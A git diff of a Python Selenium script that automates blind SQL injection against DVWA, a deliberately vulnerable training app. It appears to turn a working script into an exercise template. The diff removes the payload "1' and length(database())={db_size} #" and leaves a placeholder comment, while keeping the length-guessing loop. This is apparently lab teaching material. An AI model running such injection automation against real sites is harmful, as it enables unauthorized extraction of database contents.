@@ -1,15 +1,16 @@
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
-from selenium.webdriver.support.ui import Select
-from bs4 import BeautifulSoup
 import time
 from selenium.webdriver.common.by import By
+from selenium.webdriver.chrome.service import Service
+from webdriver_manager.chrome import ChromeDriverManager
 
 
 def sqlinjection(host):
-    timeToSleep=1
-    #create a new Firefox session
-    driver = webdriver.Chrome('/Users/jonghyeokkim/Downloads/chromedriver')
+    timeToSleep = 1
+    # create a new Chrome session
+    s = Service(ChromeDriverManager().install())
+    driver = webdriver.Chrome(service=s)
 
     #driver.implicitly_wait(30)
     driver.maximize_window()
@@ -34,11 +35,12 @@ def sqlinjection(host):
     driver.get(host+"/vulnerabilities/sqli_blind/")
     sucess_message = 'User ID exists in the database.'
     is_true = False
-    db_size = 1
+    version_len = 1
     while not is_true:
         inputElement = driver.find_element("name","id")
         time.sleep(1)
-        inputElement.send_keys(f"1' and length(database())={db_size} #")
+        # Send SQL attack query here
+        # inputElement.
         time.sleep(1)
         inputElement.send_keys(Keys.ENTER)
         time.sleep(1)
@@ -46,9 +48,9 @@ def sqlinjection(host):
         if elem.text == sucess_message:
             is_true = True
         else:
-            db_size += 1
+            version_len += 1
 
-    text = f"Matched db name size : {db_size}"
+    text = f"Matched db name size : {version_len}"
     fp.write(text)
     fp.close()
     time.sleep(3)
